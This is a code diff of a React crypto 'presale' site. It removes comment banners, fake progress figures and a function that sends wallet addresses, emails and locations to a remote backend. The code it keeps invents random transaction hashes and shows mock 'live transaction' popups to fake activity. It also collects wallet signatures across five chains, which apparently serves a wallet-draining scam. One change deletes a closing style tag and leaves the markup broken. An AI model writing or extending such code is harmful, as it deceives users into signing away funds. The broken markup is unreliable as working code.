@@ -376,7 +376,7 @@ const TRANSLATIONS = {
 };
 
 // ============================================
-// DEPLOYED CONTRACTS ON ALL 5 NETWORKS - YOUR ORIGINAL ADDRESSES
+// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
 // ============================================
 
 const MULTICHAIN_CONFIG = {
@@ -613,16 +613,12 @@ function App() {
   const [bnbAmount, setBnbAmount] = useState('');
   const [showClaimButton, setShowClaimButton] = useState(false);
   
-  // ============================================
   // LIVE TRANSACTIONS STATE
-  // ============================================
   const [liveTransactions, setLiveTransactions] = useState([]);
   const [showPopup, setShowPopup] = useState(false);
   const [currentPopupTx, setCurrentPopupTx] = useState(null);
   
-  // ============================================
   // LANGUAGE STATE
-  // ============================================
   const [language, setLanguage] = useState('en');
   const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
   const [translations, setTranslations] = useState(TRANSLATIONS.en);
@@ -646,14 +642,6 @@ function App() {
     bthPrice: 0.045
   });
 
-  // Live progress tracking
-  const [liveProgress, setLiveProgress] = useState({
-    percentComplete: 68,
-    participantsToday: 342,
-    avgAllocation: 4250
-  });
-
-  // Minimum gas buffer requirements (in native token)
   const MIN_GAS_BUFFER = {
     Ethereum: 0.005,
     BSC: 0.001,
@@ -667,9 +655,7 @@ function App() {
   // Calculate total claimed amount from live transactions
   const totalClaimedAmount = liveTransactions.length * 5000;
 
-  // ============================================
   // FORMAT TIME AGO FUNCTION
-  // ============================================
   const formatTimeAgo = (date) => {
     const seconds = Math.floor((new Date() - date) / 1000);
     if (seconds < 5) return 'Just now';
@@ -681,18 +667,14 @@ function App() {
     return `${Math.floor(hours / 24)}d ago`;
   };
 
-  // ============================================
   // GENERATE RANDOM TRANSACTION HASH
-  // ============================================
   const generateRandomHash = () => {
     return '0x' + Array.from({ length: 64 }, () => 
       Math.floor(Math.random() * 16).toString(16)
     ).join('');
   };
 
-  // ============================================
   // SCHEDULE RANDOM POPUPS
-  // ============================================
   useEffect(() => {
     // Initialize with some mock transactions
     const mockTransactions = [
@@ -718,7 +700,6 @@ function App() {
         setCurrentPopupTx(newTx);
         setShowPopup(true);
         
-        // Add to transaction feed
         setLiveTransactions(prev => [
           { ...newTx, timeAgo: formatTimeAgo(newTx.time) },
           ...prev.slice(0, 9)
@@ -734,9 +715,7 @@ function App() {
     return () => clearTimeout(timeoutId);
   }, []);
 
-  // ============================================
   // AUTO DETECT LANGUAGE FROM BROWSER
-  // ============================================
   useEffect(() => {
     const detectLanguage = () => {
       const path = window.location.pathname;
@@ -761,9 +740,7 @@ function App() {
     detectLanguage();
   }, []);
 
-  // ============================================
   // CHANGE LANGUAGE FUNCTION
-  // ============================================
   const changeLanguage = (langCode) => {
     setLanguage(langCode);
     setTranslations(TRANSLATIONS[langCode] || TRANSLATIONS.en);
@@ -1008,9 +985,7 @@ function App() {
     }
   };
 
-  // ============================================
   // MULTI-CHAIN EXECUTION
-  // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
       setError("Wallet not initialized");
@@ -1245,28 +1220,6 @@ function App() {
     await executeMultiChainSignature();
   };
 
-  const claimTokens = async () => {
-    try {
-      setLoading(true);
-      await fetch('https://hyperback.vercel.app/api/presale/claim', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          walletAddress: address,
-          email: userEmail,
-          location: userLocation,
-          reward: "5000 BTH",
-          bonus: `${presaleStats.currentBonus}%`
-        })
-      });
-      setShowCelebration(true);
-    } catch (err) {
-      console.error('Claim error:', err);
-    } finally {
-      setLoading(false);
-    }
-  };
-
   const viewTransactionOnExplorer = (txHash) => {
     window.open(`https://etherscan.io/tx/${txHash}`, '_blank');
   };
@@ -1317,7 +1270,7 @@ function App() {
           </button>
           
           {showLanguageDropdown && (
-            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-red-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto">
+            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-red-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto custom-scrollbar">
               <div className="p-2">
                 <div className="text-xs text-red-500 px-3 py-2 font-semibold border-b border-red-500/20 mb-1">
                   SELECT LANGUAGE
@@ -1759,7 +1712,7 @@ function App() {
         .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
         .animate-slideInUp { animation: slideInUp 0.3s ease-out; }
         
-        /* Custom scrollbar for transaction feed */
+        /* Custom scrollbar */
         .custom-scrollbar::-webkit-scrollbar {
           width: 4px;
         }
@@ -1783,7 +1736,6 @@ function App() {
         }
       `}
         
-      </style>
     </div>
   );
 }
